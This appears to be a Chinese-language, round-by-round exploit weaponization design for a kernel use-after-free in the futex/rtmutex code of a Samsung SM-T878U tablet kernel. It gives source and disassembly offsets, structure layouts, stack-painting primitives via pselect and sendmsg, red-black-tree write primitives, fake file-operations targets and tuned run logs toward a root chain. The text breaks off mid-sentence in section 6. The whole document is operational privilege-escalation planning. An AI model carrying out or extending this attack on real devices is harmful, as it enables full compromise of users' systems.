# GhostLock (CVE-2026-43499) on SM-T878U — 武器化设计（第七轮，定论版）

目标内核：`Kernel_T878USQS8DXE2` / 4.19.113-27114284 / arm64 / 8 核
真值来源：`firmware_extract/ap/boot_kernel.bin.elf`（62 MB，含符号）+ `scratch/panic/lastkmsg_825.txt`
（**注意：源码树里的 `include/linux/spinlock_types.h` 与二进制不一致，一律以二进制为准**）

---

> **⚠️⚠️ 第 13 轮更正（2026-10-01 16:20）：本文档的 §5 与 §12 已被证伪。**
> 「pselect 能把 `W_waiter->lock` 涂成 `fake_lock`」是**错的**——
> `scratch/panic/prev_dump_designj.log` 的 `X25` 内存 dump 逐字显示
> `waiter->lock = 0x56fbdcba4ce30b1f`（栈金丝雀），**一个涂过的字都没留下**，
> 崩溃点正是 `rtmutex.c:585` 的 `raw_spin_trylock(垃圾)`。
> **先读 §13。** §5/§12 中「涂栈能落地 / 不要再找别的涂法」的结论请全部作废。

> **⚠️⚠️⚠️ 第 14 轮更正（2026-10-01 16:35）：§13.5 / §13.6 / §13.7 也已被证伪。**
> 「预置 `R->pi_state_cache` ⇒ `put_pi_state(P)` 走 `kfree`」**在结构上不可能生效**：
> `futex_requeue()` 在 `2043`（`futex_proxy_trylock_atomic` → `attach_to_pi_owner` →
> `alloc_pi_state()`，`futex.c:1282`）就已经把 cache 抽空，而那个 `put_pi_state()` 在 `2198`
> ——**中间没有任何重新填充的机会**。`P` 在这条路径上永远不会被 `kfree`。
> 唯一释放点是 `do_exit`（`kernel/exit.c:913-914`），与 rearm 互斥。
> 同时 §11/§12 把 `walk_reached_725=1` 当成「进展」是**误读**：单节点树的根是 BLACK，
> `rb_insert_color()` 立刻 `break`，**一个字节都没写**。
> **先读 §14。** 真正的原语是「让 W 从 futex 超时返回 ⇒ `W->pi_blocked_on` 变成
> 对 W 自己内核栈的 UAF，可由 W 的下一个阻塞型 syscall 重新涂写」。

> **✅ 第 15 轮进展（2026-10-01 17:05）：涂栈原语找到了，§14.10 的阻塞已解除。**
> **`sendmsg()`** 的 `___sys_sendmsg()` 里有**两处**用户→内核栈的裸拷贝，
> 拼起来**正好覆盖 `SP0-0x190` 起整个 `struct rt_mutex_waiter`（0x50 字节）**，
> 而且 `sendmsg` 随后会阻塞（涂写得以存活）：
> `struct sockaddr_storage address`（`SP0-0x168`，经 `move_addr_to_kernel()` 裸拷 ≤128 字节）
> \+ `struct iovec iovstack[8]`（`SP0-0x1e8`，经 `rw_copy_check_uvector()` 一次裸拷 `nr_segs*16` 字节）。
> 参数：`msg_namelen = 0x28`（涂 `waiter+0x28..0x50`，含 `lock`@`+0x38`、`prio`@`+0x40`）、
> **`msg_iovlen ≤ 5`**（关键：不碰 `waiter+0x00..0x28`，保住残余 `RB_CLEAR_NODE`）。
> 同时更正三处旧结论：**(A)** `do_notify_resume` 实测只覆盖 `[SP0-0x160, SP0+0x50)`，
> 即 `waiter+0x30..0x50`，**不会冲掉 `tree_entry`/`pi_tree_entry`**（§13 的「被完整冲掉」是错的）；
> **(B)** `task_to_waiter(p)` 是**复合字面量** `&(struct rt_mutex_waiter){...}`，
> 所以把 `waiter->prio` 涂成 `0x7fffffff` 就能同时通过链入口与 `rtmutex.c:569` 两道门；
> **(C)** `__rb_insert()` Case 3 还会附带写 `*(TARGET-0x10)`，并要求 `*(TARGET-0x10) == 0`。
> **先读 §15。**

> **✅ 第 16 轮定稿（2026-10-03 晚）：环 1 的形状定死为 `target-left`，本文档
> §12.5 / §13.6 / §15.19 里所有 `ghostlock-right` / `target-right` 的建议全部作废。**
> `__rb_erase_augmented()` 的 Case 1 有两种，只有 **Case 1 变体**（`!child`，
> `rbtree_augmented.h:193-199`）能让写目标与写值同时自由：
> `write_pc = fake_fops`、`write_right = data_addr(ASHMEM_MISC_FOPS)`、`write_left = 0`。
> 走 Case 1 会让 `child->__rb_parent_color = pc` 把 **`fake_fops->owner`** 涂成非 0，
> 于是 `fops_get()` → `try_module_get()` 的 `module->refcnt @ +0x318`
> 落到 `abc_hub_driver.driver.acpi_match_table`（恒 0）⇒ **`open("/dev/ashmem")` = `-ENODEV`**。
> 另外：**W 从 futex 返回到阻塞 `sendmsg` 之间不得有任何 syscall**（`pipe_write` 的帧
> 精确覆盖 `waiter+0x00..0x58`），W 侧 `pr_*` 已改为由 R 打印。
> **先读 §16，再读 `ROOT_CHAIN_THEORY.md`。**

---

## 0. TL;DR —— 本轮推翻了上一轮的两条结论

| # | 上一轮的结论 | 本轮实测/源码结论 |
|---|---|---|
| 1 | “残余 waiter 的 `lock` 字段完全合法，所以**不需要**塑形” | **对，但不够**：它合法是因为 `pi_state` **根本没有被释放**，见 #2 |
| 2 | “`owner` 超时后 `FUTEX_UNLOCK_PI` ⇒ `put_pi_state` ⇒ `pi_state` 被 `kfree`，然后 kmalloc-96 回收” | **错**。`put_pi_state()` 走的是 **per-task 缓存**分支：chunk 被塞进 `current->pi_state_cache`，**不进 slab**。所以回收喷射打不到它 |
| 3 | “`rt_mutex_adjust_prio_chain` 会在 `rtmutex.c:723` 解引用 NULL 而崩” | **只在 `lock->owner != NULL` 时成立**。缓存分支把 `pi_mutex.owner` 清成 0，于是 walk 在 `rtmutex.c:698` 提前 `return 0`（并 wake W），**永不触达 723**。这正是零重启 oracle 能活下来的真正原因 |

**结论：zero-reboot oracle 的“存活”不是因为 `prerequeue_top_waiter` 非空，而是因为 walk 在 698 就退出了。**
这也意味着：**当前 hold 路径下 `W->pi_blocked_on` 确实是悬垂的（UAF 成立），但悬垂指针指向的是一块“活着且被 M 缓存”的 pi_state，而不是空闲 chunk。**

---

## 1. Bug 本体（逐行核对，源码 = 二进制）

`kernel/locking/rtmutex.c`：

```c
1068 static void remove_waiter(struct rt_mutex *lock, struct rt_mutex_waiter *waiter)
1069 {
1071     bool is_top_waiter = (waiter == rt_mutex_top_waiter(lock));
1072     struct task_struct *owner = rt_mutex_owner(lock);
1077     raw_spin_lock(&current->pi_lock);
1078     rt_mutex_dequeue(lock, waiter);
1079     current->pi_blocked_on = NULL;      /* ← BUG：应为 waiter->task->pi_blocked_on */
1080     raw_spin_unlock(&current->pi_lock);
1086     if (!owner || !is_top_waiter) return;
...
1115     rt_mutex_adjust_prio_chain(owner, RT_MUTEX_MIN_CHAINWALK, lock, next_lock, NULL, current);
1119 }
```

触发链（全部已核对）：

1. `futex.c:2156` `futex_requeue()` 调
   `rt_mutex_start_proxy_lock(&pi_state->pi_mutex, this->rt_waiter, this->task)`
   其中 `this` = **W 的 futex_q**，但 `current` = **执行 requeue 的 M**。
2. `rtmutex.c:1797` `rt_mutex_start_proxy_lock()` → `__rt_mutex_start_proxy_lock()`（1748）
   → `task_blocks_on_rt_mutex(..., RT_MUTEX_FULL_CHAINWALK)`。
3. 因为 `owner_thread` 自己也阻塞在 `f_pi_chain` 上（`owner->pi_blocked_on != NULL`），
   FULL 链走 `rtmutex.c:600` 命中 `rt_mutex_owner(pi_mutex(f_pi_chain)) == top_task(W)` ⇒ `-EDEADLK`。
4. 回到 `rtmutex.c:1805` `if (unlikely(ret)) remove_waiter(lock, waiter);` ⇒ **以 `current == M` 执行**。
5. ⇒ `M->pi_blocked_on = NULL`，而 **`W->pi_blocked_on` 保持悬垂**。

实测确认：`requeue ret=-1 errno=35`（`EDEADLK`）——`-EDEADLK` 只可能来自第 3 步的链走，
因此第 4 步必然执行。✔ UAF 成立。

**`remove_waiter()` 不清 `waiter->task/lock/prio/deadline`**，所以残余 waiter 仍是完整合法的：
`task = W`、`lock = &pi_state->pi_mutex`、`prio = W 阻塞时的 prio`。

### 1.1 `-EDEADLK` 的另一条路（重要，避免误判）

`futex.c:1385`
```c
	if ((unlikely((uval & FUTEX_TID_MASK) == vpid)))     /* vpid = top_waiter->task 的 tid */
		return -EDEADLK;
```
`futex_proxy_trylock_atomic()`（1867）也会返回 `-EDEADLK`，此时 `futex_requeue` 在
`switch (ret) default: goto out_unlock`（2102）**直接返回，`remove_waiter` 不会被调用**。
所以判定 UAF 是否成立，不能只看 errno，必须看 `f_pi_target` 的 futex 字是否等于 W 的 tid。
本项目的用例里 `f_pi_target` 由 `owner_thread` 持有（字 = owner tid ≠ W tid），故走的是第 4 步。✔

---

## 2. 关键新发现：`pi_state` 走的是“缓存”而不是“释放”

`kernel/futex.c`：

```c
 805 static int refill_pi_state_cache(void)
 809     if (likely(current->pi_state_cache)) return 0;
 812     pi_state = kzalloc(sizeof(*pi_state), GFP_KERNEL);
 823     current->pi_state_cache = pi_state;

 828 static struct futex_pi_state *alloc_pi_state(void)
 830     struct futex_pi_state *pi_state = current->pi_state_cache;
 833     current->pi_state_cache = NULL;
 835     return pi_state;

 847 static void put_pi_state(struct futex_pi_state *pi_state)
 852     if (!atomic_dec_and_test(&pi_state->refcount)) return;
 859     if (pi_state->owner) {
 862         raw_spin_lock_irq(&pi_state->pi_mutex.wait_lock);
 866         list_del_init(&pi_state->list);
 869         rt_mutex_proxy_unlock(&pi_state->pi_mutex, owner);   /* pi_mutex.owner = has_waiters?1:0 */
 870         raw_spin_unlock_irq(&pi_state->pi_mutex.wait_lock);
 871     }
 873     if (current->pi_state_cache) {
 874         kfree(pi_state);                     /* ← 只有在缓存已占用时才真释放 */
 875     } else {
 881         pi_state->owner = NULL;
 882         atomic_set(&pi_state->refcount, 1);
 883         current->pi_state_cache = pi_state;  /* ← 实际走这里：chunk 留在任务里 */
 884     }
```

`futex_requeue()` 的调用顺序（`refill_pi_state_cache()` 的全部调用点是
`futex.c:1969`（`futex_requeue`，`requeue_pi` 分支）与 `futex.c:2830`（`futex_lock_pi`））：

> **记法**：下面 `current` 是**执行 `FUTEX_CMP_REQUEUE_PI` 的那个 task**，
> 在本仓库里是 **main 线程 R**（不是 `owner_thread` M）。`pi_state_cache` 是 per-task 的，
> 这一点对 §6 B1 至关重要。

* `futex.c:1969` `refill_pi_state_cache()` → **R** 的缓存被填上一块新 chunk（记作 **P**）
* `futex.c:1282`（`attach_to_pi_owner`）`alloc_pi_state()` → **把 P 取走**，R 的缓存变空
  （`refill_pi_state_cache` 只在缓存为空时才 `kzalloc`，所以整条 `futex_requeue` 里 P 是唯一一块）
* `futex.c:2154` `get_pi_state(pi_state)`；`2156` `rt_mutex_start_proxy_lock()` → `remove_waiter()`（BUG）
* `futex.c:2181` `put_pi_state(pi_state)`（丢掉 2154 那次引用）
* `futex.c:2198` `put_pi_state(pi_state)`（丢掉 `futex_proxy_trylock_atomic`/`lookup_pi_state` 那次引用）
  ⇒ refcount 归 0 ⇒ `pi_state->owner != NULL` ⇒ `rt_mutex_proxy_unlock()` ⇒
  `pi_mutex.owner = 0`（waiters 已被 `remove_waiter` 清空）⇒ **`current->pi_state_cache` 为空 ⇒ 缓存分支**

**反过来说：只要某次 futex 操作**没有**调用 `alloc_pi_state`（即走 `attach_to_pi_state`），
`put_pi_state` 就会 `kfree`。这是唯一能真释放的窗口 —— 见 §6 B4 为什么仍然走不通（refcount）。**

**最终状态（实测与 oracle 行为一致）：**

| 字段 | 值 |
|---|---|
| `pi_state` chunk | **仍然分配**，被 `M->pi_state_cache` 持有（`pi_state->owner = NULL`，`refcount = 1`，`list` = 自指） |
| `pi_mutex.wait_lock` | 未锁定（raw_lock = 0） |
| `pi_mutex.waiters` | 空（`rb_node = 0`，`rb_leftmost = 0`） |
| `pi_mutex.owner` | **0** |
| `W->pi_blocked_on` | 悬垂 → 指向上面这个 `pi_mutex`（= chunk + 0x10） |

---

## 3. 链走逐门核对（`rt_mutex_adjust_prio_chain`, rtmutex.c:448-796）

入口：`rt_mutex_adjust_pi(W)`（rtmutex.c:1126，被 `sched/core.c:5213` 在 `if (pi)` 下调）
⇒ `rt_mutex_adjust_prio_chain(W, MIN_CHAINWALK, orig_lock=NULL, next_lock=waiter->lock, orig_waiter=NULL, top_task=W)`

* `1126-1138` 前置门：`waiter = W->pi_blocked_on`；`rt_mutex_waiter_equal(waiter, task_to_waiter(W))`
  对非 DL 任务退化为 `waiter->prio == W->prio`。
  ⇒ **必须让 `sched_setattr(W, nice)` 真正改变 `W->prio`（120 → 121）**，否则此处直接 return，链走不发生。
  （历史 bug：`sched_setattr_tid()` 曾 `(void)nice_value;` 丢弃 nice，现已用
  `IONSTACK_CONSUMER_REAL_NICE=1` 修复。）
* `474` `depth > max_lock_depth(1024)` → `-EDEADLK`
* `502` `raw_spin_lock_irq(&W->pi_lock)`（真锁）
* `507` `waiter = W->pi_blocked_on`（悬垂残余 waiter）
* `518` `if (!waiter) out` — 非空
* `525` `orig_waiter && !rt_mutex_owner(orig_lock)` — `orig_waiter == NULL`，跳过
* `537` `if (next_lock != waiter->lock) out` — 我们传入 `next_lock = waiter->lock`，相等
* `545-560` `top_waiter == NULL`，跳过
* `569` `rt_mutex_waiter_equal(waiter, task_to_waiter(W))` — 121 ≠ 120，跳过
* `579` `lock = waiter->lock` = `chunk + 0x10`
* **`585` `if (!raw_spin_trylock(&lock->wait_lock)) { unlock pi_lock; cpu_relax(); goto retry; }`**
  —— **dump 825 的崩溃点**（`pc : _raw_spin_trylock+0x1c`，`x0 = x21 = 0x58f7d8c05d291bc1` 即被 pselect 涂脏的 `waiter->lock`）。
  `_raw_spin_trylock` 在 `+0x1c` 处是 `ldr w8, [x0]`，读的就是 `lock + 0x00` 的 4 字节锁字。
* `600` `if (lock == orig_lock || rt_mutex_owner(lock) == top_task) { ret = -EDEADLK; out_unlock_pi; }`
  ⇒ **干净出口 A**（无写入、无唤醒）。要命中需 `lock->owner == W`。
* `613` `if (!requeue)` — `detect_deadlock == false`（MIN）且 569 未命中 ⇒ `requeue == true`，跳过
* `661` `prerequeue_top_waiter = rt_mutex_top_waiter(lock)`
* `664` `rt_mutex_dequeue(lock, waiter)` — 残余 waiter 的 `tree_entry` 已被 `RB_CLEAR_NODE` 成自指 ⇒ `RB_EMPTY_NODE` 为真 ⇒ **空操作**
* `682/683` `waiter->prio = task->prio(=121); waiter->deadline = task->dl.deadline;`（写 W 的内核栈）
* **`685` `rt_mutex_enqueue(lock, waiter)`** ← 写入原语
  ```
  link = &lock->waiters.rb_root.rb_node;   /* = lock + 0x10 */
  while (*link) { parent = *link; entry = rb_entry(parent, rt_mutex_waiter, tree_entry);
                  if (rt_mutex_waiter_less(waiter, entry)) link = &parent->rb_left;
                  else { link = &parent->rb_right; leftmost = false; } }
  rb_link_node(&waiter->tree_entry, parent, link);   /* node->__rb_parent_color = parent;
                                                        node->rb_left = node->rb_right = NULL;
                                                        *link = &waiter->tree_entry;   ← 任意写 */
  rb_insert_color_cached(&waiter->tree_entry, &lock->waiters, leftmost);
  ```
* `698` `if (!rt_mutex_owner(lock)) { if (prerequeue != top) wake_up_process(top->task); unlock; return 0; }`
  ⇒ **干净出口 B**（会唤醒 W）。**缓存分支下 `owner == 0`，走的就是这里。**
* `711` `task = rt_mutex_owner(lock); get_task_struct(task); raw_spin_lock(&task->pi_lock);`
  ⇒ 需要 `lock->owner` 是**真实 task**，否则 `refcount_inc(&task->usage)` 野写
* `716` `if (waiter == rt_mutex_top_waiter(lock))`
* **`723` `rt_mutex_dequeue_pi(task, prerequeue_top_waiter)`**
  ⇒ 若 `prerequeue_top_waiter == NULL`，则 `RB_EMPTY_NODE(&NULL->pi_tree_entry)` 读地址 `0x18` ⇒ **崩**。**地雷 1**
* `724` `rt_mutex_enqueue_pi(task, waiter)` ← 第二个写入原语（写进 `task->pi_waiters`）
* `725` `rt_mutex_adjust_prio(task)` → `rtmutex.c:337`
  ```c
  343  if (task_has_pi_waiters(p)) pi_task = task_top_pi_waiter(p)->task;
  346  rt_mutex_setprio(p, pi_task);       /* 走真调度器！对 fake task 极危险 */
  ```
* `759` `next_lock = task_blocked_on_lock(task)`
* `777` `if (!next_lock) goto out_put_task;` ⇒ **干净出口 C**
* `785` `if (!detect_deadlock && waiter != top_waiter) goto out_put_task;`
* `788` `goto again` ⇒ 第二轮 `537` 通常会因 `next_lock != waiter->lock` 而 **干净出口 D**

### 3.1 两条地雷（设计必须绕开）

1. **`723` 的 `prerequeue_top_waiter == NULL`**：只要走 `711+` 分支且 716 为真，就会解引用 NULL。
   ⇒ 必须让 `lock->waiters` 在 661 处**非空**（放一个真实 waiter X），或让 716 为假（`leftmost=false`）。
2. **`725` 的 `rt_mutex_adjust_prio(fake_task)`** → `rt_mutex_setprio()` 会读 `p->sched_class`、
   `p->normal_prio`、`task_rq(p) = cpu_rq(task_thread_info(p)->cpu)` 并操作 rq。
   ⇒ **`lock->owner` 必须是真实 task**（最好选一个“不忙”的），不能是 chunk 内的伪 task。

---

## 4. 二进制实测的结构布局（务必以此为准）

`__rt_mutex_init` @ `0xffffff800814869c`：
```
mov x8, #-0x100000000        ; 0xFFFFFFFF_00000000
mov x9, #-0x1                ; 0xFFFFFFFF_FFFFFFFF
stp xzr, xzr, [x0, #0x18]
str xzr, [x0, #0x10]
stp x8, x9, [x0]             ; [0x00]=raw_lock|owner_cpu, [0x08]=owner
```
`_raw_spin_trylock` @ `0xffffff8009c1958c`：`+0x1c: ldr w8,[x0]`（锁字）；
成功路径 `+0x88: str x9,[x0,#0x8]`（owner=current）、`+0x8c: str w10,[x0,#0x4]`（owner_cpu=cpu）。

⇒ **`raw_spinlock_t` = 16 字节，且没有 `magic` 字段**（因此不存在 `SPINLOCK_MAGIC` 的 `BUG_ON`，好消息）：

| 偏移 | 字段 |
|---|---|
| `+0x00` | `arch_spinlock_t raw_lock` (4B，取值 0=未锁) |
| `+0x04` | `owner_cpu` (4B) — **被内核调试代码写脏** |
| `+0x08` | `owner` (8B) — **被内核调试代码写脏** |

`rt_mutex_next_owner` @ `0xffffff8008148fac` 与 `rt_mutex_proxy_unlock` 交叉验证：

| `struct rt_mutex` 偏移 | 字段 |
|---|---|
| `+0x00` | `wait_lock`（16B：raw_lock / owner_cpu / owner） |
| `+0x10` | `waiters.rb_root.rb_node` |
| `+0x18` | `waiters.rb_root.rb_leftmost` |
| `+0x20` | `owner` |

`struct futex_pi_state`（声明序即实际序，`__randomize_layout` 在 clang 下无效）：

**⚠️ 本节曾把 `pi_mutex.owner`（chunk+0x30）与 `futex_pi_state.owner`（chunk+0x38）写混，
下面是 `put_pi_state` @ `0xffffff800818cc04` 反汇编实测值：**

```
+0x20: add  x8, x0, #0x40       ; &pi_state->refcount          -> refcount  @0x40
+0x40: ldr  x8, [x19, #0x38]    ; pi_state->owner              -> owner     @0x38
+0x48: add  x20, x19, #0x10     ; &pi_state->pi_mutex          -> pi_mutex  @0x10
+0x5c: add  x22, x21, #0x8c8    ; &owner->pi_lock              -> pi_lock   @0x8c8
+0x9c: ldr  x9, [x8, #0x9f8]    ; current->pi_state_cache      -> cache     @0x9f8
```

| chunk 偏移 | 字段 | 相对 `pi_mutex` |
|---|---|---|
| `+0x00` | `struct list_head list` (16B) | — |
| `+0x10` | `struct rt_mutex pi_mutex` | `+0x00` |
| `+0x10 + 0x10 = +0x20` | `pi_mutex.waiters.rb_root.rb_node` | `+0x10` |
| `+0x10 + 0x18 = +0x28` | `pi_mutex.waiters.rb_root.rb_leftmost` | `+0x18` |
| `+0x10 + 0x20 = +0x30` | **`pi_mutex.owner`** | `+0x20` |
| `+0x38` | **`struct task_struct *owner`**（`futex_pi_state` 自己的） | — |
| `+0x40` | `atomic_t refcount` | — |
| `+0x48` | `union futex_key key` (24B) | — |

`sizeof(struct futex_pi_state) = 0x48 + 0x18 = 0x60 = 96` ⇒ **kmalloc-96，对象正好 96 字节**。

`task_struct` 相关偏移（`put_pi_state` 实测）：

| 偏移 | 字段 |
|---|---|
| `+0x8c8` | `pi_lock`（`raw_spinlock_t`，16B） |
| `+0x9f8` | `pi_state_cache` |

`struct rt_mutex_waiter`（0x50）：

| 偏移 | 字段 |
|---|---|
| `+0x00` | `tree_entry`（`__rb_parent_color` / `rb_right` / `rb_left`） |
| `+0x18` | `pi_tree_entry` |
| `+0x30` | `task` |
| `+0x38` | `lock` |
| `+0x40` | `prio` |
| `+0x48` | `deadline` |

**W 的残余 waiter 位于 `SP0 - 0x190`**（`do_futex` 帧内），`SP0 = pt_regs - 0x50`。
`waiter->lock` 在 `SP0 - 0x158`。

---

## 5. pselect 涂栈路线 —— **上一轮的「结构上不可行」结论被本轮实测推翻**

### 5.1 上一轮的推理（部分正确，结论错误）

`fs/select.c:622`：`if (size > sizeof(stack_fds)/6)` ⇒ `size > 42` ⇒ `kvmalloc`。
`size = FDS_BYTES(nfds) = 8*ceil(nfds/64)` ⇒ 栈上 `stack_fds` 只在 **`nfds ≤ 320`** 时可用。

* pselect6：`stack_fds` 在 `SP0-0x210`，**输入集**（`fds.in/out/ex`）只占字 `[0, 3*wps)`；
  `nfds=320 ⇒ wps=5` ⇒ 输入集最多覆盖到 `SP0-0x198`。
* waiter 在 `SP0-0x190` ⇒ 起始字 16；`waiter->lock` 在字 23。
* 想让**输入集**覆盖字 23 需要 `3*wps > 23` ⇒ `wps ≥ 8` ⇒ `size ≥ 64` ⇒ `6×64 = 384 > 256` ⇒ `kvmalloc` ⇒ 堆，不叠栈。

⇒ **「用输入集涂」这条路确实关闭。** 但上一轮由此跳到「整个栈涂路线关闭」，**这一步是错的**。

### 5.2 实测：`res_*` 输出集的值是「可塑」的

`res_in/res_out/res_ex` 覆盖字 15..29，恰好包含 waiter 的**全部字段**（见 §8 第 8 项的表）。
`core_sys_select()` 在 `do_select()` 之前 `zero_fd_set()`，然后 `do_select()` 把**就绪的 fd**
对应的位在 `res_*` 里置 1。于是：

> **`res_*[i]` 的值 = 「第 i 组 64 个 fd 里哪些是就绪的」这个位图 —— 是我们完全可以逐位构造的。**

只要把目标 u64 的每一位映射到一个 fd 的「是否就绪」，用 pipe/socket 造出对应的就绪状态即可。
一个内核指针只需要 ~40 个 1 位，完全可行。

实测日志（`scratch/runs/rearm2_20261001_141155.log`，本机实跑）：
```
[*] pselect reach nfds=320 words_per_set=5 shift=16 waiter_words=10 global=16..25 user_words=0..14 total_words=0..29 bytes_per_set=40 stack_bitmap=1 user_reachable=0 installable=1
[*] pselect field map task_ok=1 via=out[2] lock_ok=1 via=out[3] prio_ok=1 via=out[4] hold_safe=1 res_in0_global=15
[*] pselect place task     waiter_word=6 shift=16 global=22 via out->res_out[2] value=ffffffc00322d980 bits=36
[*] pselect place lock     waiter_word=7 shift=16 global=23 via out->res_out[3] value=ffffffc0dcb784d0 bits=42
[*] pselect place prio     waiter_word=8 shift=16 global=24 via out->res_out[4] value=0000000000000082 bits=2
[*] pselect place deadline waiter_word=9 shift=16 global=25 via ex->res_ex[0]  value=0000000000000000 bits=0
[*] pselect place tree0    waiter_word=0 shift=16 global=16 via in->res_in[1]  value=0000000000000001 bits=1
[*] pselect place tree1    waiter_word=1 shift=16 global=17 via in->res_in[2]  value=0000000000000000 bits=0
[*] pselect place tree2    waiter_word=2 shift=16 global=18 via in->res_in[3]  value=0000000000000000 bits=0
[*] pselect place pi_tree0 waiter_word=3 shift=16 global=19 via in->res_in[4]  value=0000000000000001 bits=1
[*] pselect place pi_tree1 waiter_word=4 shift=16 global=20 via out->res_out[0] value=0000000000000000 bits=0
[*] pselect place pi_tree2 waiter_word=5 shift=16 global=21 via out->res_out[1] value=0000000000000000 bits=0
[*] pselect res-race summary task=ffffffc00322d980 lock=ffffffc0dcb784d0 prio=130 task_bits=36 lock_bits=42 prio_bits=2 paint_tree=1 hold=1 shift=16 nfds=320
[*] pselect returned attempt=1 ret=83 errno=0 expect_ready≈82 paint_ok=1 post_armed=1 ...
```
* `lock=ffffffc0dcb784d0` 就是回收页里的 `fake_lock`（同一日志 `page-ready` 行给出
  `fake_lock=ffffffc0dcb784d0`）⇒ **`waiter->lock` 被成功涂成受控地址**。
* `task=ffffffc00322d980` 就是 `init_task` ⇒ `waiter->task` 也被涂了。
* `paint_ok=1`（`ret=83` 对上 `expect_ready≈82`）⇒ 就绪位图确实按设计成型。

⇒ **「`do_notify_resume` 的 `0x1b0` 帧一定会冲掉 waiter」这个断言在本机不成立**（实测
`paint_ok=1`、设备零重启）。上一轮把它当成死循环论证，属于过度推断。

**但路线仍然脆弱**：`dump 825`（更早的一版参数）里 `waiter->lock` 是垃圾
`0x58f7d8c05d291bc1`，说明在**某些时序/参数下**涂的值会被后续帧盖掉。
所以它是「能工作但不稳定」的通道，而不是干净原语。

### 5.3 **本轮新发现（关键）：`rt_mutex_adjust_pi(W)` 的前置早退必然成立，所以 `prio` 这一格是「承重」的**

`rtmutex.c:1126-1138`：
```c
	waiter = task->pi_blocked_on;
	if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) { unlock; return; }
```
非 DL 下退化为 `waiter->prio == task->prio`。而本用例里：
* `W_waiter->prio` 由 `task_blocks_on_rt_mutex` 写成 `waiter->prio = task->prio` = 阻塞当时的 `W->prio`；
* `W->prio = min(W->normal_prio, M->prio)`（因为 M 阻塞在 W 持有的 `f_pi_chain` 上，
  `rt_mutex_adjust_prio(W)` 把 `W->pi_top_task = M`）；
* `M->prio = min(M->normal_prio, W->prio)`（M 被 W 经 `P->pi_mutex` 提升）。

两者联立、且 `nice ≥ 0` ⇒ `W->prio = M->prio = 120`，**与怎么设 nice 无关**。
⇒ `W_waiter->prio == W->prio == 120` **恒成立** ⇒ `rt_mutex_adjust_pi(W)` **必然早退**。

**结论：`waiter->prio`（字 24，`res_out[4]`）必须被外部改写，链走才会发生。**
这正是 §5.2 日志里 `prio=130 / bits=2` 那一步的**真正作用**（不是修饰，而是承重）。
⇒ **pselect 涂栈路线不是可选项，而是这条利用链的必要环节。**
（也解释了 `consumer_thread` 注释里「painted prio=130, chain walk into reclaimed page」的说法。）

**推论**：若某次运行 `prio` 没涂上（或涂成 120），链走不会发生，也不会崩 ——
表现为「消费线程返回 0、设备存活、但没有任何写入原语」。排查时应优先核对这一点。

---

## 6. 修正后的攻击链

### 步骤 A（已完成，零重启 oracle 通过）
`IONSTACK_ROUTE_HOLD=1` 下只做 requeue，不跑 pselect ⇒ 设备零重启存活。
日志：`scratch/runs/hold_20261001_133118.log`，`boot_id` 前后一致。

### 步骤 B（**第二次修正**：B1 必须由「执行 requeue 的那个 task」来做）

**修正 1 —— `pi_state_cache` 是 per-task 的。**
`put_pi_state()` 里的 `current->pi_state_cache` 是**调用 `futex_requeue()` 的那个 task**。
本仓库里执行 requeue 的是 **main 线程（记作 R）**，不是 `owner_thread`（M）。
所以 B1 的 `FUTEX_LOCK_PI(fC)` **必须由 R 自己发**，否则取不到那块 chunk。
（副作用：R 会在 B1 里阻塞在 `&P->pi_mutex` 上，所以「arm consumer / 读结果」必须交给别的线程。）

**修正 2 —— B1 之后不需要额外放 waiter X。**
`futex_lock_pi()` 在 `futex_lock_pi_atomic()` 返回 0（已建好 pi_state）之后是：
```c
	WARN_ON(!q.pi_state);
	__queue_me(&q, hb);
	rt_mutex_init_waiter(&rt_waiter);
	raw_spin_lock_irq(&q.pi_state->pi_mutex.wait_lock);
	spin_unlock(q.lock_ptr);
	ret = __rt_mutex_start_proxy_lock(&q.pi_state->pi_mutex, &rt_waiter, current);  /* futex.c:2917 */
	raw_spin_unlock_irq(&q.pi_state->pi_mutex.wait_lock);
	if (ret) { if (ret == 1) ret = 0; goto cleanup; }
	ret = rt_mutex_wait_proxy_lock(&q.pi_state->pi_mutex, to, &rt_waiter);          /* 阻塞 */
```
`__rt_mutex_start_proxy_lock` → `task_blocks_on_rt_mutex(..., RT_MUTEX_FULL_CHAINWALK)`
会把 **R 自己的 waiter（记作 `Rw`）enqueue 到 `&P->pi_mutex`**，并做一次
`rt_mutex_adjust_prio(p)`（`p` = B1 选定的 owner）。
⇒ `P->pi_mutex.waiters.rb_leftmost = &Rw->tree_entry ≠ NULL` ⇒ **地雷 1 自动绕开**
（661 处 `prerequeue_top_waiter = Rw ≠ NULL`），而且 `Rw` 也已被 `rt_mutex_enqueue_pi(p, Rw)`
放进 `p->pi_waiters`，所以 723 的 `rb_erase` 是**真删除**、不会因 `RB_EMPTY_NODE` 空转。

**修正 3 —— 要让 716 为真（走进 723/724 写入原语），必须 `W_waiter->prio < Rw->prio`。**
`rt_mutex_enqueue(lock, waiter)` 用 `rt_mutex_waiter_less`（= `left->prio < right->prio`，rtmutex.c:234）
下降，再由 `rb_insert_color_cached(..., leftmost)` 把 `rb_leftmost` 指到新节点；而 682 行刚把
`W_waiter->prio` 写成 `W->prio`。于是 top waiter 的判据变成：
```
W->prio < R->prio        即      nice(W) < nice(R)
```
实测配置：`IONSTACK_CONSUMER_NICE=1`（W→121）、`IONSTACK_R_NICE=5`（R→125）⇒ 716 为真。

**修正 4 —— 可观测量受 `__rt_effective_prio()` 的 `min()` 约束。**
`sched/core.c:4598` `prio = __rt_effective_prio(pi_task, p->normal_prio)`，而
`sched/core.c:4563` `__rt_effective_prio(pi_task, prio) = pi_task ? min(prio, pi_task->prio) : prio`。
即 `rt_mutex_setprio(p, W)` 只能**提升** p 的优先级、不能降低。所以要让
`/proc/<p_tid>/stat` 第 18 字段（`task_prio()` = `task->prio - 100`，`fs/proc/array.c:522/547`）
真的变化，必须：
```
W->prio < p->normal_prio        即      nice(W) < nice(p)
```
实测用 `IONSTACK_HELPER_NICE=19`（p→139）对 `IONSTACK_CONSUMER_NICE=1`（W→121）：
```
base = 139 - 100 = 39                         (p 静止)
mid  = min(139, R->prio=125) - 100 = 25       (B1 里 task_blocks_on_rt_mutex 的那次 adjust_prio)
post = min(139, W->prio=121) - 100 = 21       (链走 725 的那次 adjust_prio)
```
⇒ `post == 120 + nice(W)` 是「链走确实到达 725」的**充分判据**；
`mid == 120 + nice(R)` 是「B1 确实复用了缓存 chunk、并把 owner 设成了 p」的判据。两者互不混淆。

**B1 的 owner `p` 的选取约束**（`attach_to_pi_owner`，futex.c:1230-1300）：
